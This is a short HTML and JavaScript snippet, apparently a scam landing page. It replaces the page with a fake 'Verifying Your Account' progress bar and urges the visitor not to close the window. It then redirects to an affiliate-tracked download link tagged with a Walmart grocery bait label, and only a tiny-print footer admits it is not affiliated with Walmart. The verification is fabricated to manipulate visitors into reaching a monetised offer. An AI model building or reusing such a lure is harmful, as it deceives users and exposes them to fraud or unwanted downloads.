<script>
document.body.innerHTML = `
  <div style="font-family:Arial;text-align:center;padding:50px">
    <h2>🔍 Verifying Your Account...</h2>
    <div style="border:2px solid #0071ce;width:200px;margin:20px auto">
      <div id="progress" style="height:20px;background:#0071ce;width:0%"></div>
    </div>
    <p id="status">Initializing verification system</p>
  </div>
`;

let width = 0;
const interval = setInterval(() => {
  width += 1;
  document.getElementById("progress").style.width = `${width}%`;
  document.getElementById("status").textContent = 
    `${width}% Complete - Do not close this window`;
  
  if(width >= 100) {
    clearInterval(interval);
    window.location.href = "https://playabledownload.com/1802469?aff_sub=WALMART_CROCERY_CB&aff_id=2379527";
  }
}, 30);
</script>

<div style="font-size:9px;color:#666;text-align:center;margin-top:50px">
  NOT AFFILIATED WITH WALMART | 18+ ONLY | TERMS APPLY
</div>
